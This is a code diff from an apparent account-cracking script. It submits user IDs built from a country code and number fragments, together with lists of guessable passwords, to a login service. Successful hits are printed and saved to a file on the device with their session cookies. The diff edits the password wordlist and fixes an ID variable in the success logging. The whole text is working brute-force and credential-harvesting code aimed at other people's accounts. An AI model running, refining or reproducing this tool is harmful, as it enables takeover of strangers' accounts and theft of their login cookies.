@@ -231,7 +231,7 @@ def SOHAN_SN():
         print('\033[1;92m IF ID NOT COME TURN ON AIRPLNE')
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'@#@#@#','405060','445566','708090','bangladesh','i love you']
+            pwx = [love[2:],love,code+love,code+love[:3],'@#@#@#','405060','sadiya','708090','bangladesh','mababa','hridoy']
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90mCRACK PROCESS HAS BEEN COMPLETED ')
@@ -288,9 +288,9 @@ def rcrack(uid,pwx,tl):
                 if 'LOCK' in res:
                     return 'LOCK'
                 else:
-                    print(f"\r\033[38;5;46m[SOHAN-OK 💚] {cid}|{ps}")
+                    print(f"\r\033[38;5;46m[SOHAN-OK 💚] {uid}|{ps}")
                     print(f'  \r\033[1;92m   [COOKIE🍪] '+coki)
-                    open('/sdcard/SOHAN RAN.txt', 'a').write( cid+' | '+ps+'|'+coki+'\n')
+                    open('/sdcard/SOHAN RAN.txt', 'a').write( uid+' | '+ps+'|'+coki+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
